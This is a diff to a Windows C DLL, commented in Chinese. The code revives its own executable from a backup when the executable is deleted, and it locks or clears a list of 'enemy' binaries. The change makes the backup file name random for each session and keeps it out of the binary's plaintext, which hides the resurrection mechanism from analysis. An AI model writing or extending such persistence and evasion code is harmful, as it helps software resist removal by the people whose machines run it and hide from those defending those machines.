@@ -37,7 +37,7 @@
 __declspec(dllexport) const char * WINAPI XxBuildTag(void) { return "v7"; }
 
 #define XX_EXE_NAME       XX_EXE_NAME_W
-#define XX_BACKUP_NAME    XX_BACKUP_NAME_W
+#define XX_BACKUP_NAME    XX_EXE_NAME_W   /* 占位：实际不再使用（见 XXBackupNameW） */
 
 /* ---- 要锁死/清空的对方二进制名单（可按需增删） ---- */
 const WCHAR *g_enemyFiles[] = {
@@ -580,7 +580,16 @@ void EnsureXxRunning(void) {
     swprintf_s(xx, MAX_PATH, L"%s" XX_EXE_NAME, g_ownDir);
     if (GetFileAttributesW(xx) == INVALID_FILE_ATTRIBUTES) {
         WCHAR bak[MAX_PATH];
-        swprintf_s(bak, MAX_PATH, L"%s" XX_BACKUP_NAME, g_ownDir);
+        {   /* 随机备份名（每会话不同、二进制内无明文）：临时映射共享内存读会话盐 */
+            WCHAR nm[32];
+            HANDLE hMap = XXOpenShared();
+            void *v = hMap ? MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE) : NULL;
+            XXBackupNameW(v, nm, _countof(nm));
+            if (v) UnmapViewOfFile(v);
+            if (hMap) CloseHandle(hMap);
+            swprintf_s(bak, MAX_PATH, L"%s%ls", g_ownDir, nm);
+            SecureZeroMemory(nm, sizeof(nm));
+        }
         if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES) {
             SetFileAttributesW(xx, FILE_ATTRIBUTE_NORMAL);      /* 只读会挡住 CopyFile，先清掉 */
             SetFileAttributesW(bak, FILE_ATTRIBUTE_NORMAL);
@@ -607,7 +616,7 @@ void EnsureXxRunning(void) {
         }
         bResolved = XXRespawnTargetPath(view, xx, target, MAX_PATH);
         if (!bResolved)
-            WriteDefLog(L"EnsureXxRunning: 没有可复活的实例（xx.exe 与 xxres.bin 都不可用）");
+            WriteDefLog(L"EnsureXxRunning: 没有可复活的实例（xx.exe 与备份文件都不可用）");
         if (view) UnmapViewOfFile(view);
         if (hMap) CloseHandle(hMap);
     }
@@ -733,6 +742,7 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
     }
     return TRUE;
 }
+
 
 
 
